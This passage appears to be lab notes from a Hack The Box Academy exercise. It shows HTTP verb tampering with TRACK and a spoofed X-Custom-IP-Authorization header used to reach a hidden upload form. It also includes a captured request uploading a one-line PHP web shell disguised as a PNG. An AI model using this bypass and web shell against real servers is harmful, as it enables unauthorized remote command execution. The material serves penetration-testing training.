We'll need Burp Suite here to capture the request and see if we can figure out what's going on. If we capture the request and send it to Burp Repeater and then re-request the page using the `OPTIONS` method, we see that various methods are allowed: `GET,POST,PUT,TRACK,OPTIONS`. Cycling through the various options, each gives us a server error until we try the `TRACK` method and see that the `X-Custom-IP-Authorization:` header is set in the HTTP response. We can consult the [Web Attacks](https://academy.hackthebox.com/module/134/section/1159) modules on `HTTP Verb Tampering` for a refresher on this attack type.

![HTTP request to dev.inlanefreight.local with TRACK method, response includes X-Custom-IP-Authorization: 172.18.0.1.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/track_method.png)

Playing around a bit with the request and adding the header `X-Custom-IP-Authorization: 127.0.0.1` to the HTTP request in Burp Repeater and then requesting the page with the `TRACK` method again yields an interesting result. We see what appears to be a file upload form in the HTTP response body.

If we right-click anywhere in the `Response` window in `Repeater` we can select `show response in browser`, copy the resultant URL and request it in the browser we are using with the Burp proxy. A photo editing platform loads for us.

![[Pasted image 20260129072215.png]]


```bash
POST /upload.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------2138331067344897820113844314
Content-Length: 372
Origin: http://dev.inlanefreight.local
Connection: keep-alive
Referer: http://dev.inlanefreight.local/upload.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------2138331067344897820113844314
Content-Disposition: form-data; name="file"; filename="sof2389fnafsdakjn.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
-----------------------------2138331067344897820113844314
Content-Disposition: form-data; name="submit"


-----------------------------2138331067344897820113844314--
![[Pasted image 20260129072037.png]]
```
![[Pasted image 20260129072040.png]]

![[Pasted image 20260129071951.png]]
